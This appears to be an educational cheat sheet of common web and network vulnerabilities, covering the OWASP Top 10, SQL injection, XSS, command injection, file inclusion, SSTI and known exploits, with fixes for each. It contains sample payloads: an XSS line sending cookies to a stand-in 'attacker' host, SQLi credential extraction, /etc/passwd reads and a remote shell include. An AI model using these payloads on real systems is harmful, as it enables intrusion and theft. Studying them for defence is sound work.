# Vulnerabilities

## OWASP Top 10 (web, 2021)
1. **Broken Access Control** — IDOR, auth bypass.
2. **Cryptographic Failures** — weak/missing encryption, plaintext passwords.
3. **Injection** — SQLi, command injection, LDAP injection.
4. **Insecure Design** — flawed security architecture.
5. **Security Misconfiguration** — default creds, listing, debug mode, exposed `/admin`.
6. **Vulnerable Components** — outdated libs/CMS with CVEs.
7. **Identification & Auth Failures** — weak passwords, brute force, bad sessions.
8. **Software & Data Integrity Failures** — unsafe updates, deserialization.
9. **Logging & Monitoring Failures** — no logs/detection.
10. **SSRF** — server fetches an attacker-controlled URL (to internal services).

## SQL injection
User input reaches SQL unsanitised.
- Types: in-band (union, error), blind (boolean/time), out-of-band.
- Example: `' OR '1'='1`; `?id=1 UNION SELECT user,pass FROM users`.
- Tool: **sqlmap**. Fix: parameterised queries (prepared statements).

## XSS
Injecting JS that runs in the victim's browser.
- Reflected (from request), Stored (in DB, hits everyone), DOM-based.
- Example: `<script>fetch('http://attacker/'+document.cookie)</script>`.
- Fix: output encoding, CSP, HttpOnly cookies.

## Command injection
Input reaches an OS command: `ping 127.0.0.1; cat /etc/passwd`. Bypass filters via `;`, `|`, `&&`, `$(...)`. Fix: don't call a shell with input.

## CSRF
Victim unknowingly sends a request as themselves. Fix: CSRF tokens, SameSite cookies.

## IDOR / Broken Access Control
`GET /api/user/123` → change id → other users' data. Fix: authorise every object access.

## File upload / LFI / RFI
- **Upload** — webshell (`.php`) via weak checks.
- **LFI** — `?page=../../etc/passwd` (path traversal).
- **RFI** — include a remote file (`?page=http://attacker/shell`).

## SSTI / Deserialization
- **SSTI** — `{{7*7}}` → 49 → RCE via template engine.
- **Insecure deserialization** — malicious object → RCE (Java, PHP, Python pickle).

## Weak authentication
Password brute force (Hydra), default creds, password reuse, weak session tokens, JWT without signature check.

## Network / infra
MITM/ARP spoof, DNS poisoning, EternalBlue (SMB MS17-010), BlueKeep (RDP), unauthenticated services (Redis/Mongo), exposed `.git`.

## CVE & exploits
- **CVE** — vuln id (CVE-2023-30258). **CVSS** — severity 0–10.
- Search: `searchsploit <product>`, exploit-db.com, GitHub PoC, Metasploit. Always check versions (`nmap -sV`) → find CVEs.

## Defence
Input validation, parameterisation, least privilege, patching, WAF, logging, security headers (CSP, HSTS, X-Frame-Options).
